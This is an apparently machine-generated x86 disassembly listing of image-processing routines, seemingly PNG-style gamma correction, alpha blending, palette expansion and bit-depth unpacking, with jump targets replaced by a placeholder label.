movzx bx [ edx ]
cmp bx [ edi + 0x6 ]
jne r-xdata
movzx ax [ ecx - 0x1 ]
mov ebx 0x100
imul ax bx
movzx bx [ ecx ]
add ax bx
movzx eax ax
mov ebx 0xffff
cmp ax bx
jne r-xdata
jmp r-xdata
mov [ esi + 0x1 ] al
test ax ax
jne r-xdata
movzx eax [ edx ]
mov cl bl
shr eax cl
movzx ecx [ edx - 0x1 ]
mov eax [ edi + eax * 4 ]
movzx eax [ eax + ecx * 2 ]
jmp r-xdata
mov al [ ecx + 0x1 ]
cmp al 0xff
jne r-xdata
jmp r-xdata
movzx ax [ ecx + 0x1 ]
movzx eax ax
mov edx 0xff
cmp ax dx
jne r-xdata
movzx dx [ ecx - 0x1 ]
mov edi 0x100
imul dx di
movzx di [ ecx ]
add dx di
movzx edx dx
mov edi 0xffff
cmp dx di
jne r-xdata
mov [ eax + 0x3 ] dl
movzx cx [ edx + 0x5 ]
mov esi 0x100
imul cx si
movzx si [ edx + 0x6 ]
add cx si
movzx esi cx
mov ecx 0xffff
cmp si cx
jne r-xdata
movzx ebx [ edi - 0x1 ]
mov edx [ esp + 0x2c ]
mov bp [ edx + 0x2 ]
movzx ax al
imul bx ax
mov ecx 0xff
sub ecx eax
imul bp cx
add bx bp
mov ebp 0x80
add bx bp
movzx ebx bx
movzx ebp bx
mov ebx ebp
shr ebx 0x8
add ebx ebp
sar ebx 0x8
mov [ esi - 0x2 ] bl
movzx ebx [ edx + 0x4 ]
movzx bp [ edi ]
imul bx cx
imul bp ax
add bx bp
mov ebp 0x80
add bx bp
movzx ebx bx
movzx ebp bx
mov ebx ebp
shr ebx 0x8
add ebx ebp
sar ebx 0x8
mov [ esi - 0x1 ] bl
movzx ebx [ edi + 0x1 ]
mov dx [ edx + 0x6 ]
imul bx ax
imul dx cx
add bx dx
mov eax 0x80
add bx ax
movzx eax bx
mov ecx eax
shr ecx 0x8
add ecx eax
sar ecx 0x8
mov [ esi ] cl
mov ecx [ esp + 0x2c ]
movzx eax [ ecx + 0x2 ]
mov [ esi - 0x2 ] al
mov dl [ ecx + 0x4 ]
mov [ esi - 0x1 ] dl
movzx eax [ ecx + 0x6 ]
mov [ esi ] al
jmp r-xdata
add edi 0x4
add esi 0x3
sub [ esp + 0x18 ] 0x1
jne r-xdata
test al al
jne r-xdata
movzx eax [ edi - 0x1 ]
movzx eax [ eax + ecx ]
mov [ esi - 0x2 ] al
movzx eax [ edi ]
movzx eax [ eax + ecx ]
mov [ esi - 0x1 ] al
movzx eax [ edi + 0x1 ]
movzx eax [ eax + ecx ]
mov [ esi ] al
jmp r-xdata
jmp r-xdata
sub [ esp + 0x18 ] 0x1
jne r-xdata
mov bl [ esi ]
mov cl dl
mov al bl
shr al cl
and al 0x3
movzx cx al
cmp cx [ ebp + 0x8 ]
jne r-xdata
jmp r-xdata
sub [ esp + 0x18 ] 0x1
jne r-xdata
mov bl [ esi ]
mov cl dl
mov al bl
shr al cl
and al 0x3
movzx cx al
cmp cx [ edi + 0x8 ]
jne r-xdata
jmp r-xdata
sub ebp 0x1
jne r-xdata
mov bl [ esi ]
mov cl dl
mov al bl
shr al cl
and al 0xf
movzx cx al
cmp cx [ ebp + 0x8 ]
jne r-xdata
jmp r-xdata
sub [ esp + 0x18 ] 0x1
jne r-xdata
mov bl [ esi ]
mov cl dl
mov al bl
shr al cl
and al 0xf
movzx cx al
cmp cx [ edi + 0x8 ]
jne r-xdata
jmp r-xdata
sub ebp 0x1
jne r-xdata
add eax 0x6
sub [ esp + 0x14 ] 0x1
jne r-xdata
movzx ecx [ edi + 0x2 ]
mov [ edx - 0x2 ] cl
movzx ecx [ edi + 0x4 ]
mov [ edx - 0x1 ] cl
movzx ecx [ edi + 0x6 ]
mov [ edx ] cl
movzx eax [ ebp + 0x2 ]
mov [ edx - 0x2 ] al
movzx eax [ ebp + 0x4 ]
mov [ edx - 0x1 ] al
movzx eax [ ebp + 0x6 ]
jmp r-xdata
movzx edi [ edx ]
mov ebp [ esp + 0x48 ]
mov cl bl
shr edi cl
movzx ecx [ edx - 0x1 ]
mov edi [ ebp + edi * 4 ]
movzx ecx [ edi + ecx * 2 ]
mov edi [ esp + 0x30 ]
movzx edi [ edi + 0x8 ]
movzx eax ax
imul ecx eax
mov ebp 0xffff
sub ebp eax
imul edi ebp
lea ecx [ ecx + edi + 0x8000 ]
mov eax ecx
shr eax 0x10
add eax ecx
shr eax 0x10
movzx eax ax
movzx edi al
mov cl bl
shr edi cl
mov ecx [ esp + 0x44 ]
shr eax 0x8
mov ecx [ ecx + edi * 4 ]
movzx eax [ ecx + eax * 2 ]
mov edi [ esp + 0x40 ]
mov ebp [ esp + 0x2c ]
mov al [ ebp + 0x9 ]
mov [ esi ] al
mov cl [ ebp + 0x8 ]
mov [ esi + 0x1 ] cl
jmp r-xdata
mov ecx eax
shr ecx 0x8
mov [ esi + 0x1 ] al
mov [ esi ] cl
test ax ax
jne r-xdata
movzx eax [ ecx ]
mov edx [ esp + 0x34 ]
jmp r-xdata
test si si
jne r-xdata
movzx esi [ edx ]
movzx ecx bl
shr esi cl
mov [ esp + 0x18 ] ecx
movzx ecx [ edx - 0x1 ]
mov esi [ edi + esi * 4 ]
movzx esi [ esi + ecx * 2 ]
mov ecx esi
shr ecx 0x8
mov [ eax - 0x2 ] cl
mov [ esp + 0x14 ] esi
movzx ecx [ esp + 0x14 ]
mov [ eax - 0x1 ] cl
movzx esi [ edx + 0x2 ]
movzx ecx [ esp + 0x18 ]
shr esi cl
movzx ecx [ edx + 0x1 ]
mov esi [ edi + esi * 4 ]
movzx esi [ esi + ecx * 2 ]
mov ecx esi
shr ecx 0x8
mov [ eax ] cl
mov [ esp + 0x14 ] esi
movzx ecx [ esp + 0x14 ]
mov [ eax + 0x1 ] cl
movzx esi [ edx + 0x4 ]
movzx ecx [ esp + 0x18 ]
shr esi cl
movzx ecx [ edx + 0x3 ]
mov esi [ edi + esi * 4 ]
movzx esi [ esi + ecx * 2 ]
mov ecx esi
shr ecx 0x8
mov [ esp + 0x14 ] esi
mov [ eax + 0x2 ] cl
movzx ecx [ esp + 0x14 ]
jmp r-xdata
jmp r-xdata
movzx ebx [ edi - 0x1 ]
mov edx [ esp + 0x3c ]
movzx ebx [ ebx + edx ]
mov ebp [ esp + 0x30 ]
mov bp [ ebp + 0x2 ]
movzx ax al
imul bx ax
mov ecx 0xff
sub ecx eax
imul bp cx
add bx bp
mov ebp 0x80
add bx bp
movzx ebx bx
movzx ebp bx
mov ebx ebp
shr ebx 0x8
add ebx ebp
mov ebp [ esp + 0x38 ]
sar ebx 0x8
movzx ebx bl
movzx ebx [ ebx + ebp ]
mov ebp [ esp + 0x30 ]
mov [ esi - 0x2 ] bl
movzx ebx [ edi ]
movzx ebx [ ebx + edx ]
mov bp [ ebp + 0x4 ]
imul bx ax
imul bp cx
add bx bp
mov ebp 0x80
add bx bp
movzx ebx bx
movzx ebp bx
mov ebx ebp
shr ebx 0x8
add ebx ebp
mov ebp [ esp + 0x38 ]
sar ebx 0x8
movzx ebx bl
movzx ebx [ ebx + ebp ]
mov [ esi - 0x1 ] bl
movzx ebx [ edi + 0x1 ]
movzx dx [ ebx + edx ]
imul dx ax
mov eax [ esp + 0x30 ]
mov ax [ eax + 0x6 ]
imul ax cx
add dx ax
mov ecx 0x80
add dx cx
movzx eax dx
mov edx eax
shr edx 0x8
add edx eax
sar edx 0x8
movzx eax dl
mov ecx ebp
mov dl [ eax + ecx ]
mov ecx [ esp + 0x34 ]
mov [ esi ] dl
mov edx [ esp + 0x2c ]
movzx eax [ edx + 0x2 ]
mov [ esi - 0x2 ] al
movzx eax [ edx + 0x4 ]
mov [ esi - 0x1 ] al
movzx eax [ edx + 0x6 ]
mov [ esi ] al
jmp r-xdata
add edi 0x4
add esi 0x3
sub [ esp + 0x18 ] 0x1
jne r-xdata
mov [ edx ] al
add edx 0x3
sub ecx 0x1
jne r-xdata
movzx cx [ edx + 0x1 ]
mov eax 0x100
imul cx ax
movzx ax [ edx + 0x2 ]
add cx ax
movzx eax cx
mov ecx 0xffff
cmp ax cx
jne r-xdata
jmp r-xdata
add edx 0x4
add esi 0x2
sub [ esp + 0x18 ] 0x1
jne r-xdata
movzx ebx [ ecx ]
movzx bx [ ebx + edi ]
sub edx eax
imul bx ax
imul dx [ ebp + 0x8 ]
add dx bx
mov eax 0x80
add dx ax
movzx eax dx
mov edx eax
shr edx 0x8
add edx eax
sar edx 0x8
movzx eax dl
mov edx [ esp + 0x38 ]
mov edx [ esp + 0x2c ]
mov al [ edx + 0x8 ]
jmp r-xdata
mov al [ eax + edx ]
movzx edi si
movzx esi [ edx ]
movzx ecx bl
shr esi cl
mov ebx [ esp + 0x48 ]
mov [ esp + 0x18 ] ecx
movzx ecx [ edx - 0x1 ]
mov esi [ ebx + esi * 4 ]
movzx ecx [ esi + ecx * 2 ]
mov esi [ esp + 0x30 ]
imul ecx edi
movzx esi [ esi + 0x2 ]
mov ebp 0xffff
sub ebp edi
imul esi ebp
lea ecx [ ecx + esi + 0x8000 ]
mov esi ecx
shr esi 0x10
add esi ecx
movzx ecx [ esp + 0x4c ]
shr esi 0x10
movzx ebx si
mov [ esp + 0x14 ] ecx
movzx esi bl
shr esi cl
mov ecx [ esp + 0x44 ]
shr ebx 0x8
mov ecx [ ecx + esi * 4 ]
movzx ecx [ ecx + ebx * 2 ]
mov [ eax - 0x1 ] cl
mov ebx ecx
movzx ecx [ esp + 0x18 ]
shr ebx 0x8
mov [ eax - 0x2 ] bl
movzx esi [ edx + 0x2 ]
shr esi cl
movzx ecx [ edx + 0x1 ]
mov ebx [ esp + 0x48 ]
mov esi [ ebx + esi * 4 ]
movzx ecx [ esi + ecx * 2 ]
mov esi [ esp + 0x30 ]
imul ecx edi
movzx esi [ esi + 0x4 ]
imul esi ebp
lea ecx [ ecx + esi + 0x8000 ]
mov esi ecx
shr esi 0x10
add esi ecx
mov ecx [ esp + 0x14 ]
shr esi 0x10
movzx ebx si
movzx esi bl
shr esi cl
mov ecx [ esp + 0x44 ]
shr ebx 0x8
mov ecx [ ecx + esi * 4 ]
movzx ecx [ ecx + ebx * 2 ]
mov ebx ecx
mov [ eax + 0x1 ] cl
movzx ecx [ esp + 0x18 ]
shr ebx 0x8
mov [ eax ] bl
movzx esi [ edx + 0x4 ]
mov ebx [ esp + 0x48 ]
shr esi cl
movzx ecx [ edx + 0x3 ]
mov esi [ ebx + esi * 4 ]
movzx ecx [ esi + ecx * 2 ]
mov esi [ esp + 0x30 ]
imul ecx edi
movzx esi [ esi + 0x6 ]
imul esi ebp
lea ecx [ ecx + esi + 0x8000 ]
mov esi ecx
shr esi 0x10
add esi ecx
mov ecx [ esp + 0x14 ]
shr esi 0x10
movzx ebx si
movzx esi bl
shr esi cl
mov ecx [ esp + 0x44 ]
mov ecx [ ecx + esi * 4 ]
mov edi [ esp + 0x40 ]
shr ebx 0x8
movzx ecx [ ecx + ebx * 2 ]
mov ebx ecx
shr ebx 0x8
mov [ eax + 0x2 ] bl
mov bl [ esp + 0x4c ]
mov ecx [ esp + 0x2c ]
movzx ecx [ ecx + 0x3 ]
mov [ eax - 0x2 ] cl
mov ecx [ esp + 0x2c ]
movzx ecx [ ecx + 0x2 ]
mov [ eax - 0x1 ] cl
mov ecx [ esp + 0x2c ]
movzx ecx [ ecx + 0x5 ]
mov [ eax ] cl
mov ecx [ esp + 0x2c ]
movzx ecx [ ecx + 0x4 ]
mov [ eax + 0x1 ] cl
mov ecx [ esp + 0x2c ]
movzx ecx [ ecx + 0x7 ]
mov [ eax + 0x2 ] cl
mov ecx [ esp + 0x2c ]
movzx ecx [ ecx + 0x6 ]
jmp r-xdata
mov [ eax + 0x3 ] cl
add edx 0x8
add eax 0x6
sub [ esp + 0x1c ] 0x1
jne r-xdata
mov al [ edi + 0x2 ]
cmp al 0xff
jne r-xdata
jmp r-xdata
jmp r-xdata
mov [ esi ] al
add ecx 0x2
inc esi
sub [ esp + 0x18 ] 0x1
jne r-xdata
jmp r-xdata
sub_435660
sub esp 0xc
mov edx [ esp + 0x1c ]
mov eax [ esp + 0x14 ]
push ebx
push ebp
mov ebp [ esp + 0x20 ]
push esi
push edi
mov edi [ esp + 0x20 ]
mov cl [ edi + 0x9 ]
mov esi [ edi ]
mov [ esp + 0x18 ] esi
cmp cl 0x8
ja r-xdata
cmp cl 0x10
jne r-xdata
test ebp ebp
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc
retn
test edx edx
je r-xdata
movzx ebx [ edi + 0x8 ]
cmp ebx 0x6
ja r-xdata
jmp [ ebx * 4 + jump_table_435a50 ]
cmp cl 0x8
jne r-xdata
cmp cl 0x8
jne r-xdata
cmp cl 0x8
jne r-xdata
cmp cl 0x2
jne r-xdata
test esi esi
jbe r-xdata
test esi esi
jbe r-xdata
test esi esi
jbe r-xdata
test esi esi
jbe r-xdata
test esi esi
jbe r-xdata
test esi esi
jbe r-xdata
mov cl [ edi + 0x9 ]
cmp cl 0x4
jne r-xdata
mov [ esp + 0x10 ] eax
test esi esi
jbe r-xdata
movzx ebx [ esp + 0x30 ]
lea ebx [ ebx ]
jmp r-xdata
movzx ebx [ esp + 0x30 ]
mov edi edi
movzx edx [ eax ]
movzx ecx [ edx + ebp ]
mov [ eax ] cl
movzx edx [ eax + 0x1 ]
movzx ecx [ edx + ebp ]
inc eax
mov [ eax ] cl
movzx edx [ eax + 0x1 ]
movzx ecx [ edx + ebp ]
inc eax
mov [ eax ] cl
add eax 0x2
sub esi 0x1
jne r-xdata
movzx ecx [ esp + 0x30 ]
mov [ esp + 0x20 ] ecx
jmp r-xdata
movzx edx [ eax ]
mov cl [ edx + ebp ]
mov [ eax ] cl
add eax 0x2
sub esi 0x1
jne r-xdata
cmp cl 0x8
jne r-xdata
mov edx eax
test esi esi
jbe r-xdata
lea ecx [ esi - 0x1 ]
shr ecx 0x2
inc ecx
mov [ esp + 0x14 ] ecx
mov edi edi
movzx edi [ eax + 0x1 ]
mov cl bl
shr edi cl
movzx ecx [ eax ]
mov edi [ edx + edi * 4 ]
movzx edi [ edi + ecx * 2 ]
mov ecx edi
shr ecx 0x8
mov [ eax ] cl
mov [ esp + 0x20 ] edi
movzx ecx [ esp + 0x20 ]
mov [ eax + 0x1 ] cl
movzx edi [ eax + 0x3 ]
add eax 0x2
mov cl bl
shr edi cl
movzx ecx [ eax ]
mov edi [ edx + edi * 4 ]
movzx edi [ edi + ecx * 2 ]
mov ecx edi
shr ecx 0x8
mov [ eax ] cl
mov [ esp + 0x20 ] edi
movzx ecx [ esp + 0x20 ]
mov [ eax + 0x1 ] cl
movzx edi [ eax + 0x3 ]
add eax 0x2
mov cl bl
shr edi cl
movzx ecx [ eax ]
mov edi [ edx + edi * 4 ]
movzx edi [ edi + ecx * 2 ]
mov ecx edi
shr ecx 0x8
mov [ esp + 0x20 ] edi
mov [ eax ] cl
movzx ecx [ esp + 0x20 ]
mov [ eax + 0x1 ] cl
add eax 0x2
sub esi 0x1
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc
retn
movzx ecx [ eax ]
movzx edx [ ecx + ebp ]
mov [ eax ] dl
movzx ecx [ eax + 0x1 ]
movzx edx [ ecx + ebp ]
inc eax
mov [ eax ] dl
movzx ecx [ eax + 0x1 ]
movzx edx [ ecx + ebp ]
inc eax
mov [ eax ] dl
inc eax
sub esi 0x1
jne r-xdata
movzx edi [ eax + 0x1 ]
mov cl bl
shr edi cl
movzx ecx [ eax ]
mov edi [ edx + edi * 4 ]
movzx edi [ edi + ecx * 2 ]
mov ecx edi
shr ecx 0x8
mov [ eax ] cl
mov [ esp + 0x20 ] edi
movzx ecx [ esp + 0x20 ]
mov [ eax + 0x1 ] cl
movzx edi [ eax + 0x3 ]
add eax 0x2
mov cl bl
shr edi cl
movzx ecx [ eax ]
mov edi [ edx + edi * 4 ]
movzx edi [ edi + ecx * 2 ]
mov ecx edi
shr ecx 0x8
mov [ eax ] cl
mov [ esp + 0x20 ] edi
movzx ecx [ esp + 0x20 ]
mov [ eax + 0x1 ] cl
movzx edi [ eax + 0x3 ]
add eax 0x2
mov cl bl
shr edi cl
movzx ecx [ eax ]
mov edi [ edx + edi * 4 ]
movzx edi [ edi + ecx * 2 ]
mov ecx edi
shr ecx 0x8
mov [ esp + 0x20 ] edi
mov [ eax ] cl
movzx ecx [ esp + 0x20 ]
mov [ eax + 0x1 ] cl
add eax 0x4
sub esi 0x1
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc
retn
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc
retn
movzx edi [ eax + 0x1 ]
mov cl [ esp + 0x20 ]
shr edi cl
movzx ecx [ eax ]
mov edi [ edx + edi * 4 ]
movzx ecx [ edi + ecx * 2 ]
mov ebx ecx
shr ebx 0x8
mov [ eax ] bl
mov [ eax + 0x1 ] cl
add eax 0x4
sub esi 0x1
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc
retn
cmp cl 0x10
jne r-xdata
test esi esi
jbe r-xdata
dec esi
shr esi 0x1
inc esi
jmp r-xdata
movzx ecx [ eax ]
mov edi ecx
and edi 0xc
mov edx ecx
mov esi ecx
and ecx 0x3
lea eax [ edi * 4 ]
or eax edi
add eax eax
add eax eax
mov ebx edi
sar ebx 0x2
or eax ebx
or eax edi
mov bl [ eax + ebp ]
lea eax [ ecx * 4 ]
or eax ecx
add eax eax
add eax eax
or eax ecx
add eax eax
add eax eax
or eax ecx
mov cl [ eax + ebp ]
and esi 0x30
shr cl 0x2
and bl 0xcf
or bl cl
mov eax esi
sar eax 0x2
or eax esi
sar eax 0x2
and edx 0xc0
lea ecx [ esi * 4 ]
or eax ecx
mov ecx edx
sar ecx 0x2
or ecx edx
sar ecx 0x2
or eax esi
mov al [ eax + ebp ]
or ecx edx
shr bl 0x2
and al 0xc3
sar ecx 0x2
or bl al
mov eax [ esp + 0x10 ]
or ecx edx
mov dl [ ecx + ebp ]
shr bl 0x2
and dl 0xc0
or bl dl
mov [ eax ] bl
inc eax
sub [ esp + 0x14 ] 0x1
mov [ esp + 0x10 ] eax
jne r-xdata
mov edx [ esp + 0x2c ]
mov eax [ esp + 0x24 ]
mov edi [ esp + 0x20 ]
mov esi [ esp + 0x18 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc
retn
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc
retn
test esi esi
jbe r-xdata
movzx ecx [ eax ]
mov dl [ ecx + ebp ]
mov [ eax ] dl
inc eax
sub esi 0x1
jne r-xdata
movzx eax [ edx ]
mov ecx eax
and ecx 0xf0
mov edi ecx
sar edi 0x4
or edi ecx
mov cl [ edi + ebp ]
and eax 0xf
mov edi eax
shl edi 0x4
or edi eax
mov al [ edi + ebp ]
and cl 0xf0
shr al 0x4
or cl al
mov [ edx ] cl
inc edx
sub esi 0x1
jne r-xdata
movzx ecx [ esp + 0x30 ]
mov [ esp + 0x20 ] ecx
jmp r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc
retn
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc
retn
movzx edi [ eax + 0x1 ]
mov cl [ esp + 0x20 ]
shr edi cl
movzx ecx [ eax ]
mov edi [ edx + edi * 4 ]
movzx ecx [ edi + ecx * 2 ]
mov ebx ecx
shr ebx 0x8
mov [ eax ] bl
mov [ eax + 0x1 ] cl
add eax 0x2
sub esi 0x1
jne r-xdata
sub_435a70
push ecx
push ebx
mov ebx [ esp + 0xc ]
cmp [ ebx + 0x8 ] 0x3
mov edx [ ebx ]
push ebp
mov ebp [ esp + 0x18 ]
jne r-xdata
pop ebp
pop ebx
pop ecx
retn
mov al [ ebx + 0x9 ]
push esi
push edi
cmp al 0x8
jae r-xdata
cmp [ ebx + 0x9 ] 0x8
jne r-xdata
movzx eax al
sub eax 0x1
je r-xdata
pop edi
pop esi
cmp [ esp + 0x24 ] 0x0
mov eax [ esp + 0x1c ]
lea ecx [ edx + eax - 0x1 ]
je r-xdata
mov eax [ esp + 0x1c ]
lea esi [ edx - 0x1 ]
shr esi 0x3
add esi eax
lea edi [ edx + eax - 0x1 ]
lea ecx [ edx - 0x1 ]
and ecx 0x7
mov eax 0x7
sub eax ecx
test edx edx
jbe r-xdata
sub eax 0x1
je r-xdata
lea esi [ edx + edx * 2 ]
mov [ esp + 0x18 ] esi
lea eax [ esi + eax - 0x1 ]
test edx edx
jbe r-xdata
lea esi [ edx * 4 ]
mov [ esp + 0x18 ] esi
lea eax [ esi + eax - 0x1 ]
test edx edx
jbe r-xdata
mov [ ebx + 0x9 ] 0x8
mov [ ebx + 0xb ] 0x8
mov [ ebx + 0x4 ] edx
mov [ esp + 0x10 ] edx
mov eax [ esp + 0x1c ]
lea esi [ edx - 0x1 ]
shr esi 0x2
add esi eax
lea edi [ edx + eax - 0x1 ]
lea ecx [ edx - 0x1 ]
and ecx 0x3
mov eax 0x3
sub eax ecx
add eax eax
test edx edx
jbe r-xdata
sub eax 0x2
jne r-xdata
mov [ ebx + 0xb ] 0x18
mov [ ebx + 0x8 ] 0x2
mov [ ebx + 0xa ] 0x3
mov [ ebx + 0x4 ] esi
mov [ ebx + 0x9 ] 0x8
mov edi edx
nop
pop edi
mov [ ebx + 0x4 ] esi
pop esi
pop ebp
mov [ ebx + 0xb ] 0x20
mov [ ebx + 0x8 ] 0x6
mov [ ebx + 0xa ] 0x4
mov [ ebx + 0x9 ] 0x8
pop ebx
pop ecx
retn
mov edi edx
inc eax
xor eax eax
dec esi
jmp r-xdata
mov [ esp + 0x10 ] edx
mov edi edi
mov eax [ esp + 0x1c ]
lea esi [ edx - 0x1 ]
shr esi 0x1
add esi eax
lea edi [ edx + eax - 0x1 ]
mov eax edx
and eax 0x1
add eax eax
add eax eax
test edx edx
jbe r-xdata
movzx esi [ ecx ]
lea edx [ ebp + esi * 2 ]
movzx edx [ esi + edx + 0x2 ]
mov [ eax ] dl
movzx esi [ ecx ]
lea edx [ ebp + esi * 2 ]
movzx edx [ esi + edx + 0x1 ]
dec eax
mov [ eax ] dl
movzx esi [ ecx ]
lea edx [ ebp + esi * 2 ]
movzx edx [ esi + edx ]
dec eax
mov [ eax ] dl
dec eax
dec ecx
sub edi 0x1
jne r-xdata
mov esi [ esp + 0x18 ]
mov edx [ esp + 0x24 ]
mov dl [ esi + edx ]
mov [ eax ] dl
mov [ eax ] 0xff
jmp r-xdata
mov bl [ esi ]
mov cl al
shr bl cl
and bl 0x1
mov [ edi ] bl
cmp eax 0x7
jne r-xdata
mov ebx [ esp + 0x18 ]
dec edi
sub [ esp + 0x10 ] 0x1
jne r-xdata
add eax 0x2
xor eax eax
dec esi
jmp r-xdata
mov [ esp + 0x10 ] edx
movzx esi [ ecx ]
cmp esi [ esp + 0x28 ]
jl r-xdata
mov esi [ esp + 0x18 ]
movzx esi [ ecx ]
lea edx [ ebp + esi * 2 ]
movzx edx [ esi + edx + 0x2 ]
mov [ eax - 0x1 ] dl
movzx esi [ ecx ]
dec eax
lea edx [ ebp + esi * 2 ]
movzx edx [ esi + edx + 0x1 ]
dec eax
mov [ eax ] dl
movzx esi [ ecx ]
lea edx [ ebp + esi * 2 ]
movzx edx [ esi + edx ]
dec eax
mov [ eax ] dl
dec eax
dec ecx
sub edi 0x1
jne r-xdata
mov bl [ esi ]
mov cl al
shr bl cl
and bl 0x3
mov [ edi ] bl
cmp eax 0x6
jne r-xdata
jmp r-xdata
dec edi
sub [ esp + 0x10 ] 0x1
jne r-xdata
add eax 0x4
xor eax eax
dec esi
jmp r-xdata
mov bl [ esi ]
mov cl al
shr bl cl
and bl 0xf
mov [ edi ] bl
cmp eax 0x4
jne r-xdata
jmp r-xdata
dec edi
sub [ esp + 0x10 ] 0x1
jne r-xdata
sub_435c90
sub esp 0x10
push ebx
push ebp
mov ebp [ esp + 0x20 ]
push esi
push edi
mov edi [ esp + 0x24 ]
mov al [ edi + 0x8 ]
mov esi [ edi ]
test al al
jne r-xdata
cmp al 0x2
jne r-xdata
test ebp ebp
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
test ebp ebp
je r-xdata
mov [ esp + 0x18 ] 0x0
mov ebx [ esp + 0x18 ]
movzx ebx [ ebp + 0x8 ]
jmp r-xdata
mov al [ edi + 0x9 ]
cmp al 0x8
jne r-xdata
test ebp ebp
je r-xdata
movzx eax al
sub eax 0x1
je r-xdata
mov al [ edi + 0x9 ]
cmp al 0x8
jae r-xdata
cmp al 0x10
jne r-xdata
mov al [ ebp + 0x4 ]
mov cl [ ebp + 0x6 ]
mov bl [ ebp + 0x2 ]
mov [ esp + 0x24 ] al
mov eax [ edi + 0x4 ]
mov [ esp + 0x10 ] cl
lea ecx [ eax + edx - 0x1 ]
lea eax [ edx + esi * 4 - 0x1 ]
test esi esi
jbe r-xdata
mov al [ edi + 0x9 ]
cmp al 0x8
jne r-xdata
and ebx 0x1
imul ebx ebx 0xff
movzx ecx bx
mov [ esp + 0x18 ] ecx
lea eax [ esi + edx - 0x1 ]
lea edi [ esi - 0x1 ]
mov [ esp + 0x14 ] eax
lea ecx [ esi - 0x1 ]
shr edi 0x3
and ecx 0x7
mov eax 0x7
add edi edx
sub eax ecx
test esi esi
jbe r-xdata
sub eax 0x1
je r-xdata
mov al [ edi + 0x9 ]
mov [ edi + 0x8 ] 0x6
mov [ edi + 0xa ] 0x4
add al al
movzx eax [ ebp + 0x5 ]
movzx ecx [ ebp + 0x7 ]
mov bl [ ebp + 0x3 ]
mov [ esp + 0x10 ] al
movzx eax [ ebp + 0x2 ]
mov [ esp + 0x12 ] cl
movzx ecx [ ebp + 0x4 ]
mov [ esp + 0x24 ] al
movzx eax [ ebp + 0x6 ]
mov [ esp + 0x11 ] cl
mov ecx [ edi + 0x4 ]
mov [ esp + 0x13 ] al
lea ecx [ ecx + edx - 0x1 ]
lea eax [ edx + esi * 8 - 0x1 ]
test esi esi
jbe r-xdata
mov ebp esi
cmp al 0x10
jne r-xdata
and ebx 0xff
lea ebp [ esi + edx - 0x1 ]
lea edx [ edx + esi * 2 - 0x1 ]
test esi esi
jbe r-xdata
mov edi [ esp + 0x24 ]
mov ebx [ esp + 0x18 ]
mov [ esp + 0x1c ] esi
lea esp [ esp ]
and ebx 0x3
imul ebx ebx 0x55
movzx ecx bx
mov [ esp + 0x18 ] ecx
lea ecx [ esi - 0x1 ]
and ecx 0x3
lea edi [ esi - 0x1 ]
mov ebx 0x3
shr edi 0x2
sub ebx ecx
add edi edx
lea eax [ esi + edx - 0x1 ]
add ebx ebx
mov [ esp + 0x14 ] eax
test esi esi
jbe r-xdata
sub eax 0x2
jne r-xdata
imul eax esi
add eax 0x7
shr eax 0x3
mov [ edi + 0x4 ] eax
shr eax 0x3
imul eax esi
mov [ edi + 0x4 ] eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
mov ebp esi
mov [ eax ] 0xff
mov dl [ esp + 0x24 ]
cmp [ ecx - 0x1 ] dl
jne r-xdata
mov al [ edi + 0x9 ]
mov [ edi + 0x8 ] 0x4
mov [ edi + 0xa ] 0x2
jmp r-xdata
mov eax ebx
shr eax 0x8
mov [ esp + 0x10 ] al
mov eax [ edi + 0x4 ]
lea ecx [ eax + edx - 0x1 ]
lea eax [ edx + eax * 2 - 0x1 ]
test esi esi
jbe r-xdata
mov eax esi
jmp r-xdata
inc eax
xor eax eax
dec edi
jmp r-xdata
mov [ esp + 0x1c ] esi
mov [ edi + 0x9 ] 0x8
mov [ edi + 0xb ] 0x8
mov [ edi + 0x4 ] esi
mov eax ebx
and eax 0xf
mov ecx eax
shl ecx 0x4
add ecx eax
movzx eax cx
mov [ esp + 0x18 ] eax
lea eax [ esi - 0x1 ]
and eax 0x1
add eax eax
lea edi [ esi - 0x1 ]
shr edi 0x1
add eax eax
mov ebx 0x4
add edi edx
lea ecx [ esi + edx - 0x1 ]
sub ebx eax
mov [ esp + 0x14 ] ecx
test esi esi
jbe r-xdata
mov [ eax ] 0xff
dec eax
mov [ eax ] 0xff
mov dl [ esp + 0x24 ]
cmp [ ecx - 0x4 ] dl
jne r-xdata
cmp [ ecx - 0x2 ] bl
jne r-xdata
jmp r-xdata
mov dl [ esp + 0x10 ]
cmp [ ecx ] dl
jne r-xdata
add al al
mov [ edi + 0xb ] al
cmp al 0x8
movzx eax al
jb r-xdata
mov edi esi
lea ecx [ ecx ]
movzx cx [ ebp ]
cmp cx bx
jne r-xdata
mov bl [ edi ]
mov cl al
shr bl cl
mov ecx [ esp + 0x14 ]
and bl 0x1
neg bl
sbb bl bl
mov [ ecx ] bl
cmp eax 0x7
jne r-xdata
mov ecx 0x1
sub [ esp + 0x14 ] ecx
sub [ esp + 0x1c ] ecx
jne r-xdata
add ebx 0x2
xor ebx ebx
dec edi
jmp r-xdata
mov [ esp + 0x1c ] esi
lea ebx [ ebx ]
cmp [ ecx - 0x5 ] bl
jne r-xdata
mov dl [ esp + 0x10 ]
cmp [ ecx - 0x3 ] dl
jne r-xdata
mov [ eax ] 0x0
jmp r-xdata
mov [ eax ] 0xff
dec eax
mov [ eax ] 0xff
cmp [ ecx ] bl
jne r-xdata
mov [ edx ] 0xff
mov [ edx ] 0x0
jmp r-xdata
movzx eax [ edi ]
mov cl bl
shr eax cl
and eax 0x3
mov cl al
add cl cl
add cl cl
or cl al
add cl cl
add cl cl
or cl al
add cl cl
add cl cl
or cl al
mov eax [ esp + 0x14 ]
mov [ eax ] cl
cmp ebx 0x6
jne r-xdata
jmp r-xdata
mov eax 0x1
sub [ esp + 0x14 ] eax
sub [ esp + 0x1c ] eax
jne r-xdata
mov ebx 0x4
xor ebx ebx
dec edi
jmp r-xdata
